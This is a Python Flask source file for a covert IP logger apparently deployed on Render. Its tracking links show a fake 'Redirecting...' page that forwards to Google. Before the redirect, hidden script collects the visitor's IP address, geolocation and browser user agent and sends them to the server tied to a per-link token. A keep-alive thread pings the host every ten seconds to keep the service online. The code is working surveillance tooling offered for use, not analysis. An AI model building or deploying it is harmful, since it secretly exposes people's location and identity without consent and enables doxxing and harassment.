from flask import Flask, request, render_template_string
import requests
import os
import threading
import time
from datetime import datetime

app = Flask(__name__)

# 🔥 АВТО-ПИНГ каждые 10 секунд
def keep_alive():
    while True:
        try:
            requests.get("https://ip-logger-ks2w.onrender.com")
            print(f"🔄 Пинг: {datetime.now().strftime('%H:%M:%S')}")
        except Exception as e:
            print(f"❌ Ошибка пинга: {e}")
        time.sleep(10)  # 🔥 10 секунд!

# Запускаем пинг в отдельном потоке
ping_thread = threading.Thread(target=keep_alive)
ping_thread.daemon = True
ping_thread.start()

IP_LOGS = {}

IP_LOGGER_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="0; url=https://google.com">
</head>
<body>
    <script>
        fetch('https://ipapi.co/json/')
            .then(r => r.json())
            .then(ipData => {
                const token = window.location.pathname.split('/i/')[1];
                const data = {
                    token: token,
                    ip_info: ipData,
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                };
                
                fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
            });
    </script>
    <p>Redirecting...</p>
</body>
</html>
"""

@app.route('/')
def home():
    return "🟢 IP Logger Active - Always Online!"

@app.route('/i/<token>')
def ip_logger(token):
    print(f"🔗 Переход по токену: {token}")
    return render_template_string(IP_LOGGER_HTML)

@app.route('/log', methods=['POST'])
def log_ip():
    data = request.json
    token = data.get('token')
    ip_info = data.get('ip_info', {})
    
    print(f"📨 IP: {ip_info.get('ip')} | Город: {ip_info.get('city')} | Токен: {token}")
    
    return {'status': 'success'}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("🚀 Сервер запущен с авто-пингом каждые 10 секунд!")
    app.run(host='0.0.0.0', port=port)
